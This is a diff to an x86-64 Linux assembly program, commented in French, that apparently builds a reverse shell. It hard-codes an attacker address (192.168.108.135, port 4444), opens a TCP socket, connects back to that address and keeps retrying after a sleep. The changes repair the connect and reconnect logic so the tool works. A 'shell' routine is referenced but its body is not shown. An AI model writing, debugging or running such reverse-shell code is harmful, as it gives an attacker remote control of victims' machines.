@@ -1,7 +1,14 @@
 .section .data
     ; Section pour les données initialisées
-    TARGET_IP ;ip
-    TARGET_PORT ;port
+    TARGET_IP:
+        .short 2            ; AF_INET (2 bytes)
+        .short 0x5c11       ; Port 4444 (0x5c11)
+        .long 0xc0a86c87    ; IP cible (192.168.108.135)
+        .zero 8             ; padding
+    
+    timespec:
+        .byte 5
+        .byte 0
 
     ;============================
     ; Socket section
@@ -45,15 +52,15 @@ create_socket:
     mov rsi, SOCK_STREAM
     mov rdx, IP_PROTOCOL
     syscall
+    mov rbx, rax        ; Stocke le descripteur de socket dans rbx
 ; ----------------------------------
 ; Connexion à la cible 
 ; ----------------------------------
 connect:
     mov rax, SYSCALL_CONNECT
-    mov rdi, rax        ; Socket
-    mov rsi, TARGET_IP
-    mov rdx, TARGET_PORT
-    mov r10, SIZE_TARGET_IP
+    mov rdi, rbx
+    lea rsi, [TARGET_IP]
+    mov rdx, SIZE_TARGET_IP
     syscall
 
 ; ----------------------------------
@@ -71,9 +78,10 @@ shell:
 ; ----------------------------------
 reconnect_if_fail:
     ; Si la connexion échoue, attendre 5 secondes
-    mov rax, 5          ; Code système pour sleep
-    mov rbx, 5          ; Temps d'attente (5 secondes)
-    syscall             ; Appelle l'interruption pour dormir
+    mov rax, 35         ; nanosleep
+    mov rdi, timespec   ; Structure pour le temps d'attente
+    xor rsi, rsi
+    syscall
 
     ; Réessayer de se connecter
     jmp connect         ; Retourne à la fonction de connexion
